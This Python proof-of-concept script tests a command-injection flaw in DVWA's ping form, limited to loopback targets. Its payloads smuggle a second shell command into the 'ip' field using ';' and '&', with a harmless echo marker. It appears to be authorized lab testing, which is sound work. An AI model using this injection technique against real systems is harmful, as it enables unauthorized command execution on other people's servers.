#!/usr/bin/env python3
"""Authorized local-lab PoC draft for CMD-001 (os command injection via 'ip').

Scope: loopback targets only (localhost / 127.0.0.1 / ::1); redirects are not
followed. The DVWA "Submit" POST is reproduced with the code-derived parameter
names. Provide the session cookie through a local file, never on the CLI or in
version control.

Usage:
  python3 cmd001_poc.py --base-url http://127.0.0.1 --path /vulnerabilities/exec/ \
      --cookie-file ./local_cookie.txt --os-branch linux
  python3 cmd001_poc.py --base-url http://127.0.0.1 --path /vulnerabilities/exec/ \
      --cookie-file ./local_cookie.txt --os-branch windows
"""
import argparse
import http.cookiejar
import ipaddress
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

MARKER = "CMDINJ_MARKER_7f3a91"

# Linux/*nix branch: code runs  ping  -c 4 <target>  via /bin/sh
# Windows branch: code runs  ping  <target>  via cmd.exe
PAYLOADS = {
    "linux": "127.0.0.1; echo " + MARKER,
    "windows": "127.0.0.1 & echo " + MARKER,
}


class NoRedirect(urllib.request.HTTPRedirectHandler):
    """Refuse redirects instead of following them off-scope."""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def check_local(url):
    parts = urllib.parse.urlsplit(url)
    if parts.scheme not in ("http", "https"):
        raise SystemExit("only http/https targets are allowed")
    host = parts.hostname or ""
    if host == "localhost":
        return
    try:
        addr = ipaddress.ip_address(host)
    except ValueError:
        raise SystemExit("target must be localhost/127.0.0.1/::1, got %r" % host)
    if not addr.is_loopback:
        raise SystemExit("target must be a loopback address, got %r" % host)


def load_cookie(path):
    if not path:
        return None
    with open(path, "r", encoding="utf-8") as fh:
        raw = fh.read().strip()
    if not raw:
        return None
    if raw.lower().startswith("cookie:"):
        raw = raw.split(":", 1)[1].strip()
    return raw


def main():
    ap = argparse.ArgumentParser(description="CMD-001 local command-injection check")
    ap.add_argument("--base-url", required=True, help="e.g. http://127.0.0.1")
    ap.add_argument("--path", default="/vulnerabilities/exec/")
    ap.add_argument("--cookie-file", help="local file holding the session cookie header value")
    ap.add_argument("--os-branch", choices=("linux", "windows"), required=True,
                    help="must match the OS where the PHP code executes, not the client")
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--marker", default=MARKER, help="benign echo marker to look for")
    args = ap.parse_args()

    url = args.base_url.rstrip("/") + args.path
    check_local(url)

    payload = PAYLOADS[args.os_branch].replace(MARKER, args.marker)
    body = urllib.parse.urlencode({"Submit": "Submit", "ip": payload}).encode("utf-8")
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    cookie = load_cookie(args.cookie_file)
    if cookie:
        req.add_header("Cookie", cookie)

    opener = urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(req, timeout=args.timeout) as resp:
            status = resp.status
            text = resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        print(json.dumps({"result": "http_error", "status": exc.code}))
        return 2
    except urllib.error.URLError as exc:
        print(json.dumps({"result": "connection_error", "reason": str(exc.reason)}))
        return 3

    lowered = text.lower()
    ping_seen = ("bytes=" in lowered) or ("ttl" in lowered) or ("pinging" in lowered)
    print(json.dumps({
        "result": "response",
        "status": status,
        "marker_seen": args.marker in text,
        "marker_count": text.count(args.marker),
        "normal_ping_output_seen": ping_seen,
        "payload_sent": payload,
        "output_head": text[:400],
    }, ensure_ascii=False))
    return 0


if __name__ == "__main__":
    sys.exit(main())
